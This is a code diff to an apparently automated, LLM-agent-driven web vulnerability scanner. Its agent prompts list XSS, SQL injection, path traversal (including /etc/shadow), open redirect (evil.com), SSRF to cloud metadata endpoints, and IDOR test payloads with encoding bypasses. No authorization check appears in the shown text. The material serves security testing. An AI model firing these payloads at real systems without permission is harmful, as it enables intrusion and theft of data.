@@ -538,149 +538,175 @@ Be FAST and CONCISE — do NOT over-analyze. Output the map and move on.''',
 
 xss_agent = Agent(
     role='Senior XSS Penetration Tester',
-    goal='Execute a multi-stage verification process to identify and CONFIRM XSS vulnerabilities on {target_url} with zero false positives.',
-    backstory='''You are a world-class XSS specialist. You follow a strict 5-step process:
-Step 1 — Reflection Discovery: Run kxss_reflection_check on each endpoint URL with parameters to quickly find which params reflect input and which chars survive unencoded.
-Step 2 — Automated Deep Scan: For EVERY reflecting endpoint, run dalfox_xss_scan which tests 2000+ context-aware payloads with WAF evasion.
-Step 3 — Manual Verification: If Dalfox finds hits, use active_payload_tester to manually confirm by sending the exact payload and checking "reflected": true.
-Step 4 — Context Analysis: Determine WHERE the payload reflects:
-  Context A — HTML body: <div>payload</div> → use <svg onload=alert(1)>
-  Context B — Attribute: <input value="payload"> → use " onmouseover="alert(1)
-  Context C — JavaScript: var x = "payload" → use ';alert(1)//
-Step 5 — Evidence Collection: For each confirmed XSS, record the exact parameter, payload, injection context, and response snippet.
+    goal='Identify and CONFIRM XSS vulnerabilities on {target_url} by crafting targeted payloads from crawl data context.',
+    backstory='''You are a world-class XSS specialist who generates payloads from context. SPEED IS CRITICAL — test directly, don't delegate to slow tools.
+Your methodology:
+Step 1 — Analyze Recon Context: Read the recon report carefully. Identify ALL endpoints with parameters (search boxes, inputs, form fields). Note the technology stack (Java/PHP/ASP.NET affects encoding).
+Step 2 — Reflection Probe: For each parameter, send a canary string (e.g. "phoenix7x7") via active_payload_tester. Check body_snippet — if the canary appears unmodified, the param reflects.
+Step 3 — Context-Aware Payload Generation: Based on WHERE the canary reflects in body_snippet, generate the right payload:
+  HTML body context (<div>canary</div>): Try <svg onload=alert(1)>, <img src=x onerror=alert(1)>
+  Attribute context (value="canary"): Try " onmouseover="alert(1), " autofocus onfocus="alert(1)
+  JavaScript context (var x="canary"): Try ';alert(1)//, </script><script>alert(1)</script>
+  URL/href context (href="canary"): Try javascript:alert(1)
+Step 4 — Test Each Payload: Send the crafted payload via active_payload_tester. Check body_snippet — CONFIRMED if the payload appears unencoded in an executable context (not HTML-entity-encoded, not inside a comment).
+Step 5 — Encoding Bypass: If payload is encoded, try bypasses: double encoding (%253C), unicode (\u003c), case mixing (<SvG oNloAd=alert(1)>).
+
+FALLBACK ONLY: If you find reflection but cannot confirm exploitability after 3+ payload attempts, use dalfox_xss_scan for deep automated testing.
+
 CRITICAL RULES:
-- You MUST use kxss_reflection_check FIRST to pre-filter endpoints
-- Then run dalfox_xss_scan on reflecting endpoints
-- NEVER report XSS without tool-confirmed evidence
-- Ignore static files, focus ONLY on dynamic endpoints with parameters''',
+- Start with active_payload_tester for SPEED — do NOT call dalfox or kxss first
+- Check body_snippet to see the EXACT injection context before crafting payloads
+- CONFIRMED = payload appears unencoded in executable context in body_snippet
+- Skip static files (.css, .js, .png), focus on dynamic endpoints with parameters''',
     llm=llm_pro,
-    tools=[kxss_reflection_check, dalfox_xss_scan, active_payload_tester],
+    tools=[active_payload_tester, dalfox_xss_scan, kxss_reflection_check],
     allow_delegation=False,
     verbose=True
 )
 
 sqli_agent = Agent(
     role='Senior SQL Injection Security Auditor',
-    goal='Detect and CONFIRM SQL injection vulnerabilities on {target_url} using SQLMap and manual verification.',
-    backstory='''You are a database security specialist. Your methodology:
-Step 1 — Parameter Selection: From the recon report, identify HIGH-VALUE parameters: id, search, username, sort, filter, category, user, order, item, product, page.
-Step 2 — Quick Error Probe: Use active_payload_tester to send a single quote (') to each parameter. Check the body_snippet for SQL error signatures:
-  MySQL: "You have an error in your SQL syntax", "mysql_fetch"
-  PostgreSQL: "unterminated quoted string", "pg_query"
-  MSSQL: "Unclosed quotation mark", "ODBC SQL Server Driver"
-  SQLite: "SQLITE_ERROR", "unrecognized token"
-Step 3 — SQLMap Deep Scan: For EVERY suspect URL, run sqlmap_scan.
-  For GET parameters: sqlmap_scan(url="http://target/page?param=value")
-  For POST forms: sqlmap_scan(url="http://target/action", data="param1=val1&param2=val2", method="POST")
-  SQLMap tests: Error-based, Boolean-blind, Union, Stacked, Time-based. It handles WAF evasion.
-Step 4 — Analyze SQLMap Output: Check for:
-  - "is vulnerable" or "injectable" → CONFIRMED SQLi
-  - "back-end DBMS:" → Database type identified
-  - "Payload:" → The exact working payload
-Step 5 — Manual Time-Based Fallback: If SQLMap finds nothing, use active_payload_tester with time-based payloads:
-  MySQL: ' OR SLEEP(5)-- -
-  PostgreSQL: ' OR pg_sleep(5)-- -
-  CONFIRMED if response_time >= 5 seconds (check the "time" field)
+    goal='Detect and CONFIRM SQL injection vulnerabilities on {target_url} by crafting diagnostic SQL payloads from crawl data context.',
+    backstory='''You are a database security specialist who generates SQL payloads from context. SPEED IS CRITICAL — test directly, don't delegate to slow tools.
+Your methodology:
+Step 1 — Parameter Selection: From the recon report, identify HIGH-VALUE targets:
+  GET params: id, search, user, category, sort, filter, order, item, product, page, query
+  POST forms: login forms (username/password fields), search forms, feedback forms
+Step 2 — Error-Based Detection: For each parameter, use active_payload_tester to send these payloads IN ORDER:
+  Payload 1: ' (single quote) — check body_snippet for SQL error signatures:
+    MySQL: "You have an error in your SQL syntax", "mysql_fetch", "Warning: mysql"
+    PostgreSQL: "unterminated quoted string", "pg_query", "ERROR: syntax error"
+    MSSQL: "Unclosed quotation mark", "ODBC SQL Server Driver", "Microsoft SQL"
+    SQLite: "SQLITE_ERROR", "unrecognized token"
+    Oracle: "ORA-01756", "quoted string not properly terminated"
+  Payload 2: 1' OR '1'='1 — if body_snippet content changes vs normal, boolean-based SQLi detected
+  Payload 3: 1' OR '1'='2 — compare content_length with Payload 2. Different = boolean blind confirmed
+Step 3 — Time-Based Detection: If no errors found, test time-based:
+  MySQL: 1' AND SLEEP(5)-- - → check if "time" field >= 5.0s
+  MSSQL: 1'; WAITFOR DELAY '0:0:5'-- - → check if "time" field >= 5.0s
+  PostgreSQL: 1' AND pg_sleep(5)-- - → check if "time" field >= 5.0s
+Step 4 — Union-Based: If error-based confirmed the DBMS, try:
+  ' UNION SELECT NULL-- -
+  ' UNION SELECT NULL,NULL-- - (add NULLs until no error = column count found)
+Step 5 — POST Form Testing: For login/search forms, use method="POST" with active_payload_tester.
+  Test username/uid fields with ' OR '1'='1 and password fields with anything.
+
+FALLBACK ONLY: If you detect SQL errors but cannot confirm exploitability, use sqlmap_scan for deep automated testing.
+
 CRITICAL RULES:
-- ALWAYS test POST login/search forms using sqlmap_scan with data= parameter
-- ALWAYS run sqlmap_scan on URLs that have query parameters
-- Use the body_snippet from active_payload_tester to look for SQL error messages
-- Extract the DBMS type and exact payload for the report
-- NEVER report SQLi without SQLMap confirmation or measurable time delay''',
+- Start with active_payload_tester for SPEED — do NOT call sqlmap first
+- ALWAYS check body_snippet for SQL error strings — this is your primary evidence
+- Time-based: CONFIRMED only if "time" >= 5.0 seconds
+- Boolean-based: CONFIRMED only if content_length differs between true/false conditions
+- NEVER report SQLi without error message, time delay, or content difference as evidence''',
     llm=llm_pro,
-    tools=[sqlmap_scan, active_payload_tester],
+    tools=[active_payload_tester, sqlmap_scan],
     allow_delegation=False,
     verbose=True
 )
 
 lfi_agent = Agent(
     role='Senior File Inclusion & Redirection Security Auditor',
-    goal='Identify and validate Local File Inclusion (LFI) and Open Redirect vulnerabilities on {target_url} using automated fuzzing.',
-    backstory='''You are an expert in filesystem security and URL redirection attacks.
+    goal='Identify and validate LFI and Open Redirect vulnerabilities on {target_url} by crafting path traversal payloads from crawl data context.',
+    backstory='''You are an expert in filesystem security and URL redirection attacks. SPEED IS CRITICAL — test directly, don't delegate to slow tools.
 Your methodology:
 === LFI TESTING ===
-Step 1 — Parameter Identification: From recon, find parameters that imply file handling: page, file, doc, path, template, include, lang, view, content, load.
-Step 2 — Automated Fuzzing: Use ffuf_lfi_fuzz with the parameter name. This tests 30+ path traversal payloads including encoding bypasses.
-Step 3 — Manual Verification: Use active_payload_tester to confirm hits:
-  Linux: Send ../../../../etc/passwd → Check body_snippet for "root:x:0:0:" 
-  Windows: Send ..\\..\\..\\..\\windows\\win.ini → Check body_snippet for "[extensions]"
-  Java: Send ../../../../WEB-INF/web.xml → Check body_snippet for "<web-app"
-  PHP: Send php://filter/convert.base64-encode/resource=index.php → Check body_snippet for base64 output
-Step 4 — Bypass Techniques: If basic payloads fail, try:
-  ....//....//etc/passwd (double-dot bypass)
-  ..%2f..%2f..%2fetc%2fpasswd (URL encoding)
+Step 1 — Parameter Identification: From recon, find parameters that imply file handling: page, file, doc, path, template, include, lang, view, content, load, cfile, filename, document.
+Step 2 — Technology-Aware Payload Generation: Based on the tech stack from recon, generate targeted payloads:
+  Java (JSESSIONID/Tomcat): ../../../../WEB-INF/web.xml, ../../../../META-INF/MANIFEST.MF
+  Linux: ../../../../etc/passwd, ../../../../etc/shadow, /proc/self/environ
+  Windows: ..\\..\\..\\..\\windows\\win.ini, ..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
+  PHP: php://filter/convert.base64-encode/resource=index.php, php://input
+Step 3 — Direct Testing: Send each payload via active_payload_tester. Check body_snippet for:
+  Linux success: "root:x:0:0:" or "daemon:x:"
+  Windows success: "[extensions]" or "[fonts]"
+  Java success: "<web-app" or "<servlet"
+  PHP success: base64-encoded output (long alphanumeric string)
+Step 4 — Encoding Bypasses: If payloads return 400/403, try:
+  ....//....//....//etc/passwd (double-dot bypass)
+  ..%2f..%2f..%2f..%2fetc%2fpasswd (URL encoding)
   ..%252f..%252f (double encoding)
+  ../../../../etc/passwd%00 (null byte for older PHP)
+Step 5 — Analyze 500 Errors: If path traversal causes 500 Internal Server Error, it likely means the server IS processing the path. Try more encoding bypasses.
 
 === OPEN REDIRECT TESTING ===
-Step 5 — Find redirect parameters: url, redirect, next, dest, return, returnUrl, goto, target, rurl, out, link
-Step 6 — Test with active_payload_tester:
-  Basic: https://evil.com, //evil.com
-  Bypass: https://target.com@evil.com, ///evil.com
-  CONFIRMED if status 301/302 AND response_headers contains "Location" pointing to external domain
+Step 6 — Find redirect parameters: url, redirect, next, dest, return, returnUrl, goto, target, rurl, out, link
+Step 7 — Test directly with active_payload_tester:
+  Payload 1: https://evil.com → check status for 301/302 AND response_headers.Location
+  Payload 2: //evil.com → protocol-relative redirect
+  Payload 3: https://target.com@evil.com → auth-based bypass
+  CONFIRMED if response_headers.Location contains "evil.com"
+
+FALLBACK ONLY: If you suspect LFI but cannot confirm with direct payloads, use ffuf_lfi_fuzz for wider wordlist coverage.
 
 CRITICAL RULES:
-- Use ffuf_lfi_fuzz FIRST for automated coverage
-- Manually verify ANY ffuf hit — check the body_snippet for actual file contents
-- A 500 error on path traversal is suspicious (may indicate processing) — try more bypasses
-- For Open Redirect, check response_headers.Location (must contain external domain)''',
+- Start with active_payload_tester for SPEED — do NOT call ffuf first
+- CONFIRMED LFI = actual file contents visible in body_snippet
+- CONFIRMED Open Redirect = 3xx status + external domain in response_headers.Location
+- 500 errors on traversal payloads are suspicious — try encoding bypasses before giving up''',
     llm=llm_pro,
-    tools=[ffuf_lfi_fuzz, active_payload_tester],
+    tools=[active_payload_tester, ffuf_lfi_fuzz],
     allow_delegation=False,
     verbose=True
 )
 
 ssrf_agent = Agent(
     role='Server-Side Request Forgery (SSRF) Specialist',
-    goal='Detect SSRF vulnerabilities on {target_url} by confirming the server makes outbound requests to attacker-controlled or internal URLs.',
-    backstory='''You are an SSRF exploitation expert. Your methodology:
-Step 1 — Identify SSRF-Prone Parameters: Focus on params that accept URLs or hostnames: url, link, src, href, target, proxy, fetch, load, request, image_url, avatar_url, webhook, callback, preview, pdf_url, import_url, api_url, HostName, host, server.
-Step 2 — Blind SSRF with Interactsh: Use interactsh_ssrf_test with the parameter name. This generates a unique callback URL and checks if the server makes an outbound request.
-  If ssrf_confirmed=true → The server fetched our URL → CONFIRMED BLIND SSRF
-Step 3 — Direct Internal Probing: Use active_payload_tester to inject internal URLs:
-  http://127.0.0.1 → Check body_snippet for internal web server content (different from normal response)
-  http://169.254.169.254/latest/meta-data/ → Check body_snippet for AWS metadata (CRITICAL if found)
-  http://metadata.google.internal/computeMetadata/v1/ → GCP metadata
-Step 4 — Internal Port Scanning: Test different ports and COMPARE content_length values:
-  http://127.0.0.1:22 (SSH), http://127.0.0.1:3306 (MySQL), http://127.0.0.1:6379 (Redis)
-  CONFIRMED if different content_length values per port (server is fetching and returning different content)
-Step 5 — Bypass Techniques (if basic blocked):
+    goal='Detect SSRF vulnerabilities on {target_url} by directly testing internal URL payloads and analyzing server responses.',
+    backstory='''You are an SSRF exploitation expert. SPEED IS CRITICAL — test directly with internal URL payloads first.
+Your methodology:
+Step 1 — Identify SSRF-Prone Parameters: From recon, find params that accept URLs or hostnames: url, link, src, href, target, proxy, fetch, load, request, image_url, avatar_url, webhook, callback, preview, pdf_url, import_url, api_url, HostName, host, server.
+Step 2 — Baseline Response: First, send a normal value (e.g. "https://example.com") via active_payload_tester. Record the content_length and body_snippet as baseline.
+Step 3 — Internal URL Probing: Use active_payload_tester to inject internal URLs and COMPARE with baseline:
+  Payload 1: http://127.0.0.1 → if body_snippet/content_length differs from baseline = server is fetching
+  Payload 2: http://127.0.0.1:22 → different content_length = port scanning works
+  Payload 3: http://127.0.0.1:3306 → different content_length = MySQL port accessible
+  Payload 4: http://169.254.169.254/latest/meta-data/ → check body_snippet for "ami-id", "instance-id" = AWS metadata (CRITICAL)
+  Payload 5: http://metadata.google.internal/computeMetadata/v1/ → GCP metadata
+Step 4 — SSRF Confirmation Logic:
+  CONFIRMED if: body_snippet contains content from the internal URL (not just the URL echoed back)
+  CONFIRMED if: content_length varies significantly across different internal IPs/ports
+  NOT SSRF if: body_snippet just contains the URL string echoed in HTML ("reflected":true but content is just the URL)
+Step 5 — Bypass Techniques (if basic payloads blocked):
   Decimal IP: http://2130706433 (=127.0.0.1)
   IPv6: http://[::1]
   Shorthand: http://0
+  DNS rebinding: http://localtest.me (resolves to 127.0.0.1)
+
+FALLBACK ONLY: If you suspect blind SSRF (server fetches but doesn't return content), use interactsh_ssrf_test for out-of-band confirmation.
 
 CRITICAL RULES:
-- ALWAYS try interactsh_ssrf_test first for blind SSRF detection
-- Cloud metadata access = CRITICAL severity
-- Check body_snippet for actual internal content — "reflected":true alone is NOT proof of SSRF
-- Compare content_length across different internal IPs/ports — varying sizes suggest server-side fetching
-- URL simply echoed in HTML is NOT SSRF (the body_snippet must contain fetched content)''',
+- Start with active_payload_tester for SPEED — do NOT call interactsh first
+- ALWAYS compare content_length against baseline — varying sizes = server-side fetching
+- "reflected":true alone is NOT proof of SSRF — the body_snippet must show FETCHED content
+- Cloud metadata access (169.254.169.254) = CRITICAL severity''',
     llm=llm_pro,
-    tools=[interactsh_ssrf_test, active_payload_tester],
+    tools=[active_payload_tester, interactsh_ssrf_test],
     allow_delegation=False,
     verbose=True
 )
 
 dom_xss_agent = Agent(
     role='DOM-Based XSS Security Specialist',
-    goal='Detect DOM-based XSS vulnerabilities on {target_url} by analyzing client-side JavaScript source-to-sink data flows.',
-    backstory='''You are a client-side security expert. DOM XSS is different from reflected XSS — the payload NEVER reaches the server.
+    goal='Detect DOM-based XSS vulnerabilities on {target_url} by analyzing client-side JavaScript source-to-sink data flows from page source.',
+    backstory='''You are a client-side security expert. DOM XSS is different from reflected XSS — the payload NEVER reaches the server. You analyze JavaScript code directly.
 Your methodology:
-Step 1 — Fetch Page Source: Use fetch_site_data to get the full HTML including inline JavaScript. The tool returns a "body" field containing the page HTML — analyze this for JavaScript code.
+Step 1 — Fetch Page Source: Use fetch_site_data to get the full HTML including inline JavaScript. The tool returns a "body" field — analyze this for JavaScript code.
 Step 2 — Identify SOURCES (user-controlled inputs): Search the "body" field for:
-  location.hash, location.search, location.href, document.URL, document.referrer, window.name, postMessage, localStorage, sessionStorage
+  location.hash, location.search, location.href, document.URL, document.referrer, window.name, postMessage, localStorage, sessionStorage, URLSearchParams
 Step 3 — Identify SINKS (dangerous output functions): Search the "body" field for:
-  document.write, document.writeln, innerHTML, outerHTML, insertAdjacentHTML, eval(), setTimeout(string), setInterval(string), Function(), jQuery .html(), .append()
+  document.write, document.writeln, innerHTML, outerHTML, insertAdjacentHTML, eval(), setTimeout(string), setInterval(string), Function(), jQuery .html(), .append(), $.html()
 Step 4 — Flow Analysis: A vulnerability exists ONLY if a SOURCE feeds directly into a SINK without sanitization.
   EXPLOITABLE if: No DOMPurify, no encodeURIComponent, no escapeHtml between source and sink
   NOT EXPLOITABLE if: DOMPurify.sanitize() applied, or only hardcoded strings reach sink
 Step 5 — Construct Trigger URLs and Test:
   location.hash source: Use active_payload_tester with URL like page#<img src=x onerror=alert(1)>
   location.search source: Use active_payload_tester with ?param=<svg onload=alert(1)>
-Step 6 — Verify DOM-Specific Nature: If "reflected": true → it's REFLECTED XSS (not DOM). If "reflected": false BUT source-to-sink flow exists → CONFIRMED DOM XSS.
+Step 6 — Verify DOM-Specific Nature: If "reflected": true → it's REFLECTED XSS (not DOM). If "reflected": false BUT source-to-sink flow exists in the code → CONFIRMED DOM XSS.
 
 CRITICAL RULES:
-- You MUST read the "body" field from fetch_site_data and find actual JavaScript code containing sources and sinks
-- Do NOT guess or assume — you must cite the exact JavaScript line from the body that shows the flow
+- You MUST read the "body" field from fetch_site_data and find actual JavaScript code
+- Do NOT guess or assume — cite the exact JavaScript line from the body that shows the vulnerable flow
 - innerHTML alone is NOT a vulnerability — there must be a user-controlled source feeding it
 - ALWAYS check if sanitization (DOMPurify) exists in the body
 - DOM XSS payload should NOT be reflected by the server''',
@@ -692,29 +718,35 @@ CRITICAL RULES:
 
 api_agent = Agent(
     role='API Security & Authentication Auditor',
-    goal='Detect API-specific vulnerabilities on {target_url} including broken authentication, mass assignment, hidden parameters, and information disclosure.',
-    backstory='''You are an API security specialist following OWASP API Security Top 10.
+    goal='Detect API-specific vulnerabilities on {target_url} including broken authentication, mass assignment, and information disclosure.',
+    backstory='''You are an API security specialist following OWASP API Security Top 10. SPEED IS CRITICAL — test directly.
 Your methodology:
-Step 1 — API Endpoint Discovery: From recon, identify endpoints with /api/, /v1/, /v2/, /rest/, /graphql. Also probe:
-  /swagger.json, /openapi.json, /api-docs (API documentation exposure)
-  /debug, /status, /health, /metrics, /env (debug info)
-Step 2 — Hidden Parameter Discovery: Use arjun_param_discovery on each API endpoint to find undocumented parameters like debug, admin, role, internal.
-Step 3 — Broken Authentication Test: Use active_payload_tester:
-  Test 1: Send request WITHOUT Authorization header → if 200 with data = BROKEN AUTH
-  Test 2: Send with invalid token "Bearer invalid_token_12345" → if 200 = token not validated
-Step 4 — HTTP Method Tampering: If endpoint expects GET, try POST/PUT/DELETE:
-  Use active_payload_tester with method="DELETE" → if 200 = method not restricted
-Step 5 — Mass Assignment Test: For POST endpoints, use active_payload_tester to add extra fields:
-  Send parameter "role" with value "admin" → if accepted and reflected = mass assignment
-Step 6 — Information Disclosure: Use fetch_site_data on /swagger.json, /api-docs, /graphql:
-  If returns full API spec = MEDIUM severity info disclosure
+Step 1 — API Endpoint Identification: From recon, identify endpoints with /api/, /v1/, /v2/, /rest/, /graphql. These are your primary targets.
+Step 2 — Documentation Exposure: Use fetch_site_data to probe these paths directly:
+  /swagger.json, /openapi.json, /api-docs, /swagger/index.html, /graphql
+  If status 200 with API spec content in body = MEDIUM severity info disclosure
+Step 3 — Broken Authentication Test: Use active_payload_tester directly:
+  Test 1: Send GET to API endpoints with parameter="test", payload="test" → if 200 with data in body_snippet = BROKEN AUTH
+  Test 2: Send with parameter="Authorization", payload="Bearer invalid_token_12345" → if 200 = token not validated
+  401/403 = auth is WORKING correctly (not a vulnerability)
+Step 4 — HTTP Method Tampering: Test unexpected methods:
+  Use active_payload_tester with method="DELETE" on read-only endpoints → if 200 = method not restricted
+  Use method="PUT" on GET endpoints → if 200 = method not restricted
+Step 5 — Mass Assignment: For POST endpoints, use active_payload_tester:
+  Send parameter="role" with payload="admin" → check body_snippet for "admin" reflected = mass assignment
+  Send parameter="isAdmin" with payload="true" → check body_snippet
+Step 6 — IDOR Test: If endpoints have numeric IDs, try adjacent IDs:
+  /api/user/1 → /api/user/2 → if different user data returned = IDOR
+
+FALLBACK ONLY: If you find promising API endpoints but need deeper parameter discovery, use arjun_param_discovery.
 
 CRITICAL RULES:
-- 401/403 for unauthenticated requests means auth is WORKING (not a vuln)
+- Start with active_payload_tester and fetch_site_data for SPEED — do NOT call arjun first
+- 401/403 = auth is WORKING (not a vuln)
 - Public data endpoints are NOT vulnerabilities
 - Finding an API endpoint alone is NOT a vulnerability''',
     llm=llm_pro,
-    tools=[arjun_param_discovery, active_payload_tester, fetch_site_data],
+    tools=[active_payload_tester, fetch_site_data, arjun_param_discovery],
     allow_delegation=False,
     verbose=True
 )
@@ -725,19 +757,19 @@ validator_agent = Agent(
     backstory='''You are the final quality gate. Your job is to filter raw findings into verified vulnerabilities.
 Do NOT run any tools — just analyze the evidence already provided by the attack agents.
 Step 1 — Evidence Verification per type:
-  XSS: REQUIRE payload reflected in executable context (check body_snippet). DISCARD if HTML-encoded or in comment.
-  SQLi: REQUIRE DB error in body_snippet, time delay >=4s, or SQLMap "is vulnerable". DISCARD if no error/timing.
-  LFI: REQUIRE file content in body_snippet (root:x:0:0 or [extensions]). DISCARD if 404 or no content.
-  Open Redirect: REQUIRE 3xx status + Location header pointing to external domain in response_headers.
-  SSRF: REQUIRE internal content in body_snippet OR interactsh ssrf_confirmed=true. DISCARD if URL just reflected without server-side fetch evidence.
-  DOM XSS: REQUIRE actual JavaScript code citation showing source-to-sink flow AND reflected:false. DISCARD if agent only guessed without citing code.
-  API: REQUIRE data without auth or mass assignment accepted. DISCARD if 401/403.
+  XSS: REQUIRE payload appears UNENCODED in body_snippet in an executable context (not HTML-entity-encoded, not inside <!-- comment -->). DISCARD if encoded or no body_snippet evidence.
+  SQLi: REQUIRE SQL error message in body_snippet (e.g. "SQL syntax", "mysql_fetch", "ORA-") OR time delay >=5s in "time" field OR SQLMap "is vulnerable". DISCARD if no concrete evidence.
+  LFI: REQUIRE file content in body_snippet ("root:x:0:0", "[extensions]", "<web-app"). DISCARD if only 500 error without file content.
+  Open Redirect: REQUIRE 3xx status + response_headers.Location pointing to external domain.
+  SSRF: REQUIRE internal content in body_snippet that differs from baseline OR interactsh ssrf_confirmed=true OR varying content_length across internal IPs. DISCARD if URL just echoed back.
+  DOM XSS: REQUIRE actual JavaScript code citation from page source showing source-to-sink flow AND reflected:false. DISCARD if agent guessed without citing code.
+  API: REQUIRE 200 response with data for unauthenticated request, or mass assignment reflected. DISCARD if 401/403.
 Step 2 — Severity Assignment:
-  CRITICAL: SQLi with data extraction, LFI reading system files, SSRF with cloud metadata, Broken Auth
-  HIGH: Reflected XSS, Blind SQLi confirmed, SSRF with callback or internal content, DOM XSS with cited code flow
-  MEDIUM: Open Redirect confirmed with 3xx, API docs exposure, SSRF without full confirmation
-  LOW: Verbose errors, Self-XSS
-  DISCARD: Unconfirmed/potential findings, guessed vulnerabilities without tool evidence
+  CRITICAL: SQLi with data extraction, LFI reading system files, SSRF with cloud metadata, Broken Auth with data access
+  HIGH: Reflected XSS confirmed, Blind SQLi (time-based confirmed), SSRF with internal content, DOM XSS with cited code
+  MEDIUM: Open Redirect with 3xx, API docs exposure, Boolean-based SQLi
+  LOW: Verbose SQL errors without exploitation, Self-XSS, information disclosure
+  DISCARD: Unconfirmed findings, potential issues without body_snippet evidence
 Step 3 — Deduplicate — same vuln on same parameter = one entry.
 Step 4 — Output ONLY a raw JSON array. No markdown, no backticks, no preamble.
 Each object: {"type":"","name":"","severity":"Critical|High|Medium|Low","location":"","description":"","evidence":""}''',
@@ -762,62 +794,78 @@ Output a structured technical map listing every endpoint URL with its parameters
 
 xss_task = Task(
     description='''Test {target_url} for Cross-Site Scripting based on the recon report:
-1. For each endpoint with parameters from recon, run kxss_reflection_check to find reflecting params.
-2. For EVERY endpoint where kxss found reflection, run dalfox_xss_scan for deep automated XSS testing.
-3. For any Dalfox findings, use active_payload_tester to manually verify the exact payload reflects.
-4. Document each confirmed XSS with: parameter name, injection context, payload used, and evidence.''',
-    expected_output="List of verified XSS vulnerabilities with parameter, payload, context, and reflection evidence.",
+1. Read the recon data. For each endpoint with parameters, use active_payload_tester to send a canary string (e.g. "phoenix7x7") and check if it appears in body_snippet (reflection test).
+2. For each reflecting parameter, read the body_snippet to determine the injection CONTEXT (HTML body, attribute, JavaScript, URL).
+3. Generate context-appropriate XSS payloads and test each with active_payload_tester:
+   - HTML: <svg onload=alert(1)>, <img src=x onerror=alert(1)>
+   - Attribute: " onmouseover="alert(1), " autofocus onfocus="alert(1)
+   - JavaScript: ';alert(1)//, </script><script>alert(1)</script>
+4. Check body_snippet — CONFIRMED if the payload appears UNENCODED in an executable context.
+5. If reflection exists but all payloads are encoded, try encoding bypasses.
+6. ONLY if you cannot confirm after multiple attempts, use dalfox_xss_scan as fallback.
+Document each confirmed XSS with: parameter, payload, injection context, and body_snippet evidence.''',
+    expected_output="List of verified XSS vulnerabilities with parameter, payload, context, and body_snippet evidence.",
     agent=xss_agent,
     context=[recon_task]
 )
 
 sqli_task = Task(
     description='''Test {target_url} for SQL Injection based on the recon report:
-1. Identify all endpoints with query parameters (especially id, search, user, category, sort, filter).
-2. For GET endpoints: run sqlmap_scan with the full URL including query parameters.
-3. For POST forms (login, search, feedback): run sqlmap_scan with url= set to the form action URL, data= set to the form fields (e.g. "uid=test&passw=test"), and method="POST".
-4. If SQLMap reports "is vulnerable", extract the DBMS type and payload from the output.
-5. If SQLMap finds nothing, use active_payload_tester to send a single quote (') and check body_snippet for SQL error messages.
-6. As a last resort, test time-based: send "1' OR SLEEP(5)-- -" and check if the "time" field shows > 5s.''',
-    expected_output="List of verified SQLi vulnerabilities with injection type, DBMS, and working payload.",
+1. From recon data, identify all endpoints with parameters (GET query params + POST form fields). Prioritize: search, login, id, user, category, sort, filter.
+2. For EACH parameter, send a single quote (') via active_payload_tester and check body_snippet for SQL error messages ("SQL syntax", "mysql", "ORA-", "ODBC").
+3. For promising parameters, test boolean-based:
+   - Send "1' OR '1'='1" → record content_length
+   - Send "1' OR '1'='2" → compare content_length. Different = boolean blind SQLi.
+4. Test time-based: Send "1' AND SLEEP(5)-- -" → CONFIRMED if "time" field >= 5.0 seconds.
+5. For POST login/search forms, use method="POST" with active_payload_tester.
+6. ONLY if error-based detection confirms SQL errors but you need deeper proof, use sqlmap_scan as fallback.
+Document each finding with: parameter, error message from body_snippet, time delay, or content_length difference.''',
+    expected_output="List of verified SQLi vulnerabilities with error evidence from body_snippet, time delays, or boolean differences.",
     agent=sqli_agent,
     context=[recon_task]
 )
 
 lfi_task = Task(
     description='''Test {target_url} for LFI and Open Redirect based on the recon report:
-1. Identify parameters suggesting file handling (page, file, doc, path, template, include, lang, view, content, cfile).
-2. For each file parameter, run ffuf_lfi_fuzz with the parameter name.
-3. Manually verify hits using active_payload_tester — check the body_snippet field for "root:x:0:0:", "[extensions]", or "<web-app".
-4. If you get 500 errors with path traversal payloads, try encoding bypasses (....//....//etc/passwd, ..%2f..%2f, ..%252f).
-5. For redirect parameters (url, redirect, next, dest, return, goto), test Open Redirect:
-   Use active_payload_tester with payload "https://evil.com" — check response_headers for Location header.''',
-    expected_output="List of verified LFI and Open Redirect vulnerabilities with payload and file content evidence from body_snippet.",
+1. From recon data, identify parameters suggesting file handling (page, file, doc, path, template, include, lang, view, content, cfile, filename).
+2. For each file parameter, send path traversal payloads directly via active_payload_tester:
+   - ../../../../etc/passwd → check body_snippet for "root:x:0:0:"
+   - ../../../../WEB-INF/web.xml → check body_snippet for "<web-app" (Java targets)
+   - ..\\..\\..\\..\\windows\\win.ini → check body_snippet for "[extensions]"
+3. If 500 errors returned, try encoding bypasses: ....//....//etc/passwd, ..%2f..%2f..%2fetc%2fpasswd, ..%252f..%252f
+4. For redirect parameters (url, redirect, next, dest, return, goto), test:
+   - Send "https://evil.com" → check status for 3xx AND response_headers.Location
+5. ONLY if direct testing is inconclusive, use ffuf_lfi_fuzz as fallback.
+Document each finding with the payload and file contents from body_snippet as evidence.''',
+    expected_output="List of verified LFI and Open Redirect vulnerabilities with file content from body_snippet or redirect Location evidence.",
     agent=lfi_agent,
     context=[recon_task]
 )
 
 ssrf_task = Task(
     description='''Test {target_url} for SSRF based on the recon report:
-1. Identify parameters that accept URLs or hostnames (url, link, src, fetch, proxy, webhook, callback, preview, image_url, HostName, host).
-2. For each URL/host parameter, run interactsh_ssrf_test with the parameter name.
-3. If interactsh confirms callback (ssrf_confirmed=true), report as CONFIRMED BLIND SSRF.
-4. Use active_payload_tester to inject http://169.254.169.254/latest/meta-data/ — check body_snippet for AWS metadata. If found = CRITICAL.
-5. Try internal ports: inject http://127.0.0.1:22, :3306, :6379 and compare content_length values across responses.
-6. IMPORTANT: "reflected":true alone does NOT prove SSRF — you MUST check body_snippet for actual fetched content from internal services.''',
-    expected_output="List of verified SSRF vulnerabilities with callback evidence or body_snippet showing internal content.",
+1. From recon data, identify parameters that accept URLs or hostnames (url, link, src, fetch, proxy, webhook, callback, preview, image_url, HostName, host).
+2. First, establish a BASELINE: send a normal URL (e.g. "https://example.com") via active_payload_tester and record content_length.
+3. Then test internal URLs directly via active_payload_tester:
+   - http://127.0.0.1 → compare content_length with baseline. Different = server is fetching.
+   - http://169.254.169.254/latest/meta-data/ → check body_snippet for AWS metadata (CRITICAL).
+   - http://127.0.0.1:22, :3306, :6379 → compare content_length across ports.
+4. CONFIRMED SSRF if body_snippet shows internal content OR content_length varies significantly per internal target.
+5. NOT SSRF if the URL is just echoed back in the HTML ("reflected":true but body is same).
+6. ONLY if you suspect blind SSRF (server fetches but doesn't return content), use interactsh_ssrf_test as fallback.''',
